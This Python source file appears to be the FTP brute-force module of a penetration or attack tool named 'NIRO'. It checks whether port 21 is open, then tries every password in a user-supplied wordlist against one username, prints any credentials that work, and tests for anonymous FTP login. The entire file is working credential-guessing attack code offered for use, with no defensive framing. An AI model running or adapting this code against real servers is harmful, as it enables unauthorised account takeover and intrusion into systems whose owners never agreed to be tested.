import sys
import os.path
from os import path
import paramiko
import ftplib
from colorama import Fore
from Recon.scanPorts import probe_port



def fin():
 print(Fore.RED+"----------------END OF FTP BruteForce---------------------")
 sys.exit(0)

def anonymous(ip):
    try :
        ftp= ftplib.FTP(ip)
        ftp.login()
        print(Fore.GREEN+"-----------------------------")
        print("[+] ANONYMOUS LOGIN is OPEN")
        print("------------------------------")
        ftp.quit()
    except:
      pass

def ftp_login(ip,username_ftp,passwd):

        ftp = ftplib.FTP(ip)
        try:
         ftp.login(username_ftp, passwd)
        except ftplib.error_perm:
         return False
        else:
         print(Fore.GREEN+"[!] ACCOUNT FOUND : [FTP] Host : "+sys.argv[1]+" Login : "+username_ftp+"/"+passwd+"[SUCCESS]")
         return True

def brute_force(ip, username_ftp, wordlists):
    try:
        ftp_list = open(wordlists).read()
        words = ftp_list.splitlines()
        for word in words:
            #word = word.strip()
            print(Fore.YELLOW+"[!] ACCOUNT CHECK : [FTP] Host : "+sys.argv[1]+" Login : "+username_ftp+"/"+word)
            if (ftp_login(ip, username_ftp, word) == True):
               break
    except:
        print(Fore.RED+"[-] There is no such wordlist file.")
        fin()

def ftp_sprayingg():

 print(Fore.CYAN+"===========================================================")
 print(Fore.WHITE+"[*-*] Starting NIRO in FTP Brute force mode ...")
 print(Fore.CYAN+"===========================================================")
 
 if probe_port(sys.argv[1],21) == 0:  #verification est ce que le port 21 est ouvert
   print(Fore.GREEN+"----------------------------")
   print(" [+] 21/TCP  FTP ---> OPEN ")
   print("----------------------------")
   username_ftp = str(input(Fore.BLUE+"Enter a spesific useranme : "+Fore.WHITE))
   wordlists = str(input(Fore.BLUE+"Enter FTP list File location : "+Fore.WHITE)) 
   brute_force(str(sys.argv[1]),username_ftp,wordlists)
   veri = input(Fore.MAGENTA+"DO YOU WANT TO CHECK ANONYMOUS ACCOUNT [Y/n] : "+Fore.WHITE)
   if(veri == 'y' or veri == 'Y' ):
      anonymous(sys.argv[1])
   else:
      print(Fore.RED+"[-] INVALID CHOOSE")
 else :
    print(Fore.RED+"----------------------------")
    print("[!] 21/TCP FTP ---> CLOSED")
    print("----------------------------")
 print(Fore.RED+"---------------END OF FTP BruteForce-----------------")
